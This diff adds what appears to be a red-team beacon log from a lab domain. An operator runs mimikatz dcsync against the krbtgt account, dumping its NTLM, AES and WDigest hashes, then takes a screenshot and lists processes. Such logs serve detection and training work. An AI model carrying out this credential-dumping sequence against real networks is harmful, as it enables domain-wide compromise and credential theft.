@@ -1,0 +1,216 @@
+03/30 09:06:37 UTC [metadata] beacon_22170412 -> 10.1.4.10; computer: L-WIN227; user: ADMIN-w.trommel; process: SecurityHealthSystray.exe; pid: 7248; os: Windows; version: 10.0; beacon arch: x64 (x64)
+03/30 09:06:33 UTC [output]
+established link to parent beacon: 10.1.4.10
+
+03/30 09:06:58 UTC [input] <neo> dcsync stroop.local stroop\krbtgt
+03/30 09:06:58 UTC [task] <T1003, T1093> Tasked beacon to run mimikatz's @lsadump::dcsync /domain:stroop.local /user:stroop\krbtgt command
+03/30 09:06:58 UTC [checkin] host called home, sent: 417354 bytes
+03/30 09:06:59 UTC [output]
+received output:
+[DC] 'stroop.local' will be the domain
+[DC] 'S-WIN21.stroop.local' will be the DC server
+[DC] 'stroop\krbtgt' will be the user account
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 3/29/2020 9:54:08 AM
+Object Security ID   : S-1-5-21-2163199188-2306780613-1636707950-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: f7cd9145a9b7c2f6e342e2ab85dc540e
+    ntlm- 0: f7cd9145a9b7c2f6e342e2ab85dc540e
+    lm  - 0: edb5f8b368bf3e8a7d7323447e185e7f
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : STROOP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : c6569bece97962c95f12ee527f0cefba22934fe63098b1f9d789347b949ec14b
+      aes128_hmac       (4096) : 6f8306a0f0c80d30068dd8e6b4f7fc26
+      des_cbc_md5       (4096) : f70732e5b673b398
+
+* Primary:Kerberos *
+    Default Salt : STROOP.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : f70732e5b673b398
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  3e05f97129646f6380d255125068cd2e
+    02  25a5fc433c6b575e4215bd5846f05a4a
+    03  1063028e974d41cdcb88fe01dbb20bec
+    04  3e05f97129646f6380d255125068cd2e
+    05  25a5fc433c6b575e4215bd5846f05a4a
+    06  0791eb9218513143b8a53ac9aed2176f
+    07  3e05f97129646f6380d255125068cd2e
+    08  33255ca329b031d292598c9b9fe7d63b
+    09  33255ca329b031d292598c9b9fe7d63b
+    10  c3b59c8eea10bc63de3283ba2ae653f8
+    11  fc47502b7fc17d42d664d5c7464eb6ec
+    12  33255ca329b031d292598c9b9fe7d63b
+    13  cc1fcadc0c9d3971fdfeecb6dce3572e
+    14  fc47502b7fc17d42d664d5c7464eb6ec
+    15  fa966dc5f8347c79c7ba6c88119ade18
+    16  fa966dc5f8347c79c7ba6c88119ade18
+    17  2aa8b89401f4f93b6a9b11cd36f3188f
+    18  6caaf3241ccf42403153e44a901e603f
+    19  49ca18f2b0046b48a76437f3c19b29ef
+    20  961296ba01fbdad428b891e3a9026565
+    21  742917cb3f80b2da64e2fa31c06fd1a8
+    22  742917cb3f80b2da64e2fa31c06fd1a8
+    23  b3a86bc78731e4347ad6b839c0f844ac
+    24  fba7489f07fee7d55f109cc4db19a282
+    25  fba7489f07fee7d55f109cc4db19a282
+    26  d8ea861857a6e9381b4ae2703a154e89
+    27  4f1f2ecf0cf9f74318b3275c091efda8
+    28  fd24b5e823acb8e5fe3029e42e0501ea
+    29  2c5722f5bc0da4ce5ff26b3c0f93ebd1
+
+
+
+03/30 09:08:02 UTC [input] <neo> screenshot
+03/30 09:08:02 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+03/30 09:08:03 UTC [checkin] host called home, sent: 197186 bytes
+03/30 09:08:30 UTC [input] <neo> ps
+03/30 09:08:30 UTC [task] <T1057> Tasked beacon to list processes
+03/30 09:08:34 UTC [checkin] host called home, sent: 12 bytes
+03/30 09:08:34 UTC [output]
+[System Process]	0	0
+System	0	4
+Registry	4	88
+smss.exe	4	404
+csrss.exe	492	512
+wininit.exe	492	588
+csrss.exe	580	596
+winlogon.exe	580	684
+services.exe	588	696
+lsass.exe	588	732
+svchost.exe	696	832
+fontdrvhost.exe	588	844
+fontdrvhost.exe	684	852
+svchost.exe	696	920
+svchost.exe	696	968
+svchost.exe	696	1012
+LogonUI.exe	684	584
+dwm.exe	684	652
+svchost.exe	696	1008
+svchost.exe	696	1032
+svchost.exe	696	1052
+svchost.exe	696	1064
+svchost.exe	696	1172
+svchost.exe	696	1192
+svchost.exe	696	1208
+svchost.exe	696	1256
+svchost.exe	696	1312
+svchost.exe	696	1376
+svchost.exe	696	1456
+svchost.exe	696	1484
+svchost.exe	696	1520
+svchost.exe	696	1528
+svchost.exe	696	1644
+svchost.exe	696	1664
+svchost.exe	696	1692
+svchost.exe	696	1700
+svchost.exe	696	1784
+svchost.exe	696	1792
+svchost.exe	696	1908
+svchost.exe	696	1924
+svchost.exe	696	1976
+svchost.exe	696	1988
+svchost.exe	696	2008
+svchost.exe	696	1120
+Memory Compression	4	2128
+svchost.exe	696	2164
+VSSVC.exe	696	2200
+svchost.exe	696	2224
+svchost.exe	696	2252
+svchost.exe	696	2300
+svchost.exe	696	2380
+svchost.exe	696	2392
+svchost.exe	696	2432
+svchost.exe	696	2516
+svchost.exe	696	2532
+svchost.exe	696	2548
+svchost.exe	696	2612
+svchost.exe	696	2628
+svchost.exe	696	2700
+svchost.exe	696	2792
+svchost.exe	696	2868
+spoolsv.exe	696	3036
+OfficeClickToRun.exe	696	3156
+sysmon64.exe	696	3176
+svchost.exe	696	3188
+WaAppAgent.exe	696	3196
+svchost.exe	696	3204
+svchost.exe	696	3216
+svchost.exe	696	3224
+svchost.exe	696	3232
+svchost.exe	696	3256
+MsMpEng.exe	696	3288
+WindowsAzureGuestAgent.exe	696	3300
+WindowsAzureTelemetryService.exe	696	3348
+svchost.exe	696	3376
+svchost.exe	696	3392
+unsecapp.exe	920	3728
+svchost.exe	696	3928
+WmiPrvSE.exe	920	3312
+svchost.exe	696	4320
+svchost.exe	696	4744
+svchost.exe	696	4776
+taskhostw.exe	1256	4688
+svchost.exe	696	2656
+svchost.exe	696	5428
+WaSecAgentProv.exe	3196	6060
+conhost.exe	6060	6088
+svchost.exe	696	1076
+SgrmBroker.exe	696	5940
+svchost.exe	696	6068
+svchost.exe	696	5920
+SearchIndexer.exe	696	5636
+SecurityHealthService.exe	696	4104
+svchost.exe	696	5788
+csrss.exe	5132	4300
+winlogon.exe	5132	4592
+dwm.exe	4592	3272
+fontdrvhost.exe	4592	5980
+rdpclip.exe	1032	5588	x64	STROOP\ADMIN-w.trommel	2
+sihost.exe	1520	464	x64	STROOP\ADMIN-w.trommel	2
+svchost.exe	696	4388	x64	STROOP\ADMIN-w.trommel	2
+svchost.exe	696	1116	x64	STROOP\ADMIN-w.trommel	2
+taskhostw.exe	1256	1748	x64	STROOP\ADMIN-w.trommel	2
+powershell.exe	1256	1464	x64	STROOP\ADMIN-w.trommel	2
+svchost.exe	696	5652
+conhost.exe	1464	1684	x64	STROOP\ADMIN-w.trommel	2
+ctfmon.exe	5652	1060	x64	STROOP\ADMIN-w.trommel	2
+explorer.exe	4684	4632	x64	STROOP\ADMIN-w.trommel	2
+svchost.exe	696	372	x64	STROOP\ADMIN-w.trommel	2
+ShellExperienceHost.exe	920	6160	x64	STROOP\ADMIN-w.trommel	2
+SearchUI.exe	920	6276	x64	STROOP\ADMIN-w.trommel	2
+RuntimeBroker.exe	920	6464	x64	STROOP\ADMIN-w.trommel	2
+RuntimeBroker.exe	920	6568	x64	STROOP\ADMIN-w.trommel	2
+powershell.exe	1464	6908	x64	STROOP\ADMIN-w.trommel	2
+conhost.exe	6908	6916	x64	STROOP\ADMIN-w.trommel	2
+powershell.exe	1464	7004	x64	STROOP\ADMIN-w.trommel	2
+conhost.exe	7004	7012	x64	STROOP\ADMIN-w.trommel	2
+RuntimeBroker.exe	920	2296	x64	STROOP\ADMIN-w.trommel	2
+iexplore.exe	920	6376	x64	STROOP\ADMIN-w.trommel	2
+iexplore.exe	6376	2320	x86	STROOP\ADMIN-w.trommel	2
+smartscreen.exe	920	7204	x64	STROOP\ADMIN-w.trommel	2
+SecurityHealthSystray.exe	4632	7248	x64	STROOP\ADMIN-w.trommel	2
+svchost.exe	696	7532
+LogonUI.exe	4592	3888
+dllhost.exe	920	3128	x64	STROOP\ADMIN-w.trommel	2
+svchost.exe	696	4552	x64	STROOP\ADMIN-w.trommel	2
+rundll32.exe	7372	3284
+
+
